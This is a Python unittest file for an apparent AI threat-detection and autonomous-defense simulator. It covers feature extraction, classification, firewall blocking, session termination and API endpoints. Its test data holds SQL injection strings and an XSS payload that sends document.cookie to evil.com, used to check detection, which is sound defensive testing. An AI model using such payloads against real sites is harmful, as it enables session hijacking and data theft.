"""
Verification & Test Suite
Tests:
1. AI Model initialization and classification accuracy across all attack vectors
2. Feature extraction (entropy, special chars, sliding-window rate tracking)
3. Autonomous Defense Orchestration (Firewall blocking, session kill, SIEM alerts)
4. Simulator scenarios execution
5. REST API responses
"""

import sys
import unittest
from engine.ai_model import ThreatDetectionEngine
from engine.telemetry import TelemetryManager
from engine.defense_orchestrator import DefenseOrchestrator
from engine.simulator import AttackSimulator
from app import app

class TestCyberDefenseSimulator(unittest.TestCase):
    def setUp(self):
        self.ai = ThreatDetectionEngine()
        self.telemetry = TelemetryManager(max_events=100)
        self.defense = DefenseOrchestrator(self.telemetry)
        self.simulator = AttackSimulator(ingestion_pipeline=lambda ev: {"status": "ok", "event": ev})
        self.client = app.test_client()

    def test_feature_extraction(self):
        """Test entropy and special character detection on malicious payloads."""
        payload = "' UNION SELECT password FROM users WHERE 1=1; --"
        event = {"payload": payload, "endpoint": "/api/v1/search", "method": "POST"}
        feats = self.ai.extract_features(event)
        self.assertGreater(feats["entropy"], 3.0)
        self.assertGreater(feats["sqli_hits"], 0)
        self.assertGreater(feats["special_ratio"], 0.05)

    def test_ai_classification_sqli(self):
        """Test SQL injection classification and risk scoring."""
        event = {
            "ip": "194.26.29.112",
            "endpoint": "/api/v1/user/search",
            "method": "POST",
            "payload": "' OR 1=1 --",
            "user": "anonymous"
        }
        res = self.ai.analyze_event(event)
        self.assertEqual(res["predicted_class"], "SQL_INJECTION")
        self.assertGreaterEqual(res["risk_score"], 70)
        self.assertIn(res["risk_level"], ["HIGH", "CRITICAL"])
        self.assertEqual(res["mitre"]["id"], "T1190")

    def test_ai_classification_benign(self):
        """Test benign traffic produces LOW risk and ALLOW action."""
        event = {
            "ip": "192.168.1.15",
            "endpoint": "/api/v1/products",
            "method": "GET",
            "payload": "category=laptops&sort=asc",
            "user": "alice"
        }
        res = self.ai.analyze_event(event)
        self.assertEqual(res["predicted_class"], "BENIGN")
        self.assertLess(res["risk_score"], 35)
        self.assertEqual(res["risk_level"], "LOW")

    def test_autonomous_defense_firewall_and_session(self):
        """Test that high-risk threat autonomously triggers IP block and session termination."""
        event = {
            "ip": "185.220.101.5",
            "endpoint": "/api/v1/user/profile",
            "method": "POST",
            "payload": "<script>fetch('http://evil.com?c='+document.cookie)</script>",
            "user": "compromised_user",
            "session_id": "sess_demo_analyst"
        }
        ai_res = self.ai.analyze_event(event)
        resp = self.defense.evaluate_and_respond(event, ai_res)

        # Ensure IP is blocked in firewall
        self.assertTrue(self.defense.is_ip_blocked("185.220.101.5"))
        # Ensure session was terminated
        sessions = {s["session_id"]: s for s in self.telemetry.get_sessions()}
        self.assertEqual(sessions["sess_demo_analyst"]["status"], "TERMINATED")
        # Ensure actions include BLOCK_IP, TERMINATE_SESSION, and SECURITY_ALERT
        actions = [a["action"] for a in resp["actions"]]
        self.assertIn("BLOCK_IP", actions)
        self.assertIn("TERMINATE_SESSION", actions)
        self.assertIn("SECURITY_ALERT", actions)

    def test_api_metrics_endpoint(self):
        """Test REST API /api/metrics."""
        res = self.client.get("/api/metrics")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("total_ingested", data)
        self.assertIn("threats_neutralized", data)
        self.assertIn("defcon", data)

    def test_api_scenario_simulation(self):
        """Test executing a scenario via the API."""
        res = self.client.post("/api/simulate/scenario", json={"scenario": "brute_force", "count": 2})
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertTrue(data["success"])
        self.assertGreater(data["executed_count"], 0)

if __name__ == "__main__":
    unittest.main()
